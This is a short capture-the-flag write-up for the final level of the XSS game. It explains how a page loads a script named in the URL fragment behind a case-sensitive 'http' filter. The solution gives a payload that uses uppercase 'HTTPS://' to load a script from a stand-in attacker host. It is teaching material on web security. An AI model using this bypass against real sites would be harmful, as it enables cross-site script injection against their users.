
# Level 6: Follow the &#128007;

## Challenge Overview
- Level 6 is the **final challenge** and tests your understanding of **external script loading**.
- The application loads external resources or scripts based on URL fragments.
- **Objective**: Inject JavaScript by controlling which script gets loaded.
- **URL Structure**: `https://xss-game.appspot.com/level6/frame#[SCRIPT_PATH]`

## The Vulnerability
The application has code similar to this:
```js
function includeGadget(url) {
	var scriptEl = document.createElement('script');
  
	// This will totally prevent us from loading evil URLs!
	if (url.match(/^https?:\/\//)) {
		setInnerText(document.getElementById("log"),
		"Sorry, cannot load a URL containing \"http\".");
		return;
	}

	// Load this awesome gadget
	scriptEl.src = url;
	document.head.appendChild(scriptEl);
}

function getGadgetName() { 
	return window.location.hash.substr(1) || "/static/gadget.js";
}

includeGadget(getGadgetName());
```
The application takes a URL from `window.location.hash` and loads it as a **script without validation**.

## Understanding the Attack Vector
The application attempts to block external scripts with a regex check:
```js
if (url.match(/^https?:\/\//)) {
	return; // Block URLs starting with http:// or https://
}
```
The regex `/^https?:\/\//` is **case-sensitive**.

## Solution
The Payload:
```
HTTPS://attacker.com/xss-external.js
```
Full URL:
```
https://xss-game.appspot.com/level6/frame#HTTPS://attacker.com/xss-external.js
```
